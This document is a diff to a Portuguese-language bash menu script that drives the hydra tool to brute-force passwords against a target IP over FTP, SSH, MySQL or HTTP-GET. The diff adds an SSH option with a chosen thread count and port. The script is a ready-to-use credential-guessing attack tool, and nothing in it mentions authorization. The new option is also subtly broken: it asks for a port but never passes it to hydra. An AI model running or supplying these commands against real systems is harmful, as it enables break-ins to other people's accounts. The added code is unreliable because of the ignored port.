@@ -21,6 +21,7 @@ echo "4- SSH (COM NÚMERO DE THREADS ESPECIFICAS)"
 echo "5- SSH (COM UMA LISTA DE IP's)"
 echo "6- MYSQL"
 echo "7- HTTP-GET"
+echo "8- SSH (COM NÚMERO DE THREADS E PORTA ESPECIFICA)"
 echo " "
 
 var_ftp=ftp
@@ -28,6 +29,7 @@ var_ssh=ssh
 var_ssh2=ssh
 var_ssh3=ssh
 var_ssh4=ssh
+var_ssh5=ssh
 var_mysql=mysql
 var_httpget=http-get
 
@@ -57,7 +59,7 @@ hydra -s $var_porta -l $var_nome -P $var_arquivo $var_ip $var_ssh2
 elif [ "$var_protocolo" -eq 4 ]
 then
 read -e -p "Informe o IP do Alvo: " var_ip
-echo "VOCÊ ESCOLHEU A OPÇÃO SSH COM NÚMERO DE THREADS ESPECIFICA"
+echo "VOCÊ ESCOLHEU A OPÇÃO SSH COM NÚMERO DE THREADS ESPECIFICAS"
 read -e -p "Número de Threads: " var_threads
 hydra -l $var_nome -P $var_arquivo $var_ip -t $var_threads $var_ssh3
 
@@ -77,7 +79,15 @@ elif [ "$var_protocolo" -eq 7 ]
 then
 read -e -p "Informe o IP do Alvo: " var_ip
 echo "VOCÊ ESCOLHEU A OPÇÃO HTTP-GET"
-hydra $var_ip $var_httpget -l $var_nome -P $var_arquivo 
+hydra $var_ip $var_httpget -l $var_nome -P $var_arquivo
+
+elif [ "$var_protocolo" -eq 8 ]
+then
+read -e -p "Informe o IP do Alvo: " var_ip
+echo "VOCÊ ESCOLHEU A OPÇÃO SSH COM NÚMERO DE THREADS E PORTA ESPECIFICA"
+read -e -p "Número de Threads: " var_threads
+read -e -p "Número da Porta SSH: " var_tporta
+hydra -l $var_nome -P $var_arquivo $var_ip $var_ssh3 -t $var_threads 
 else
 echo "Você não selecionou nehuma das opções validas!"
 fi
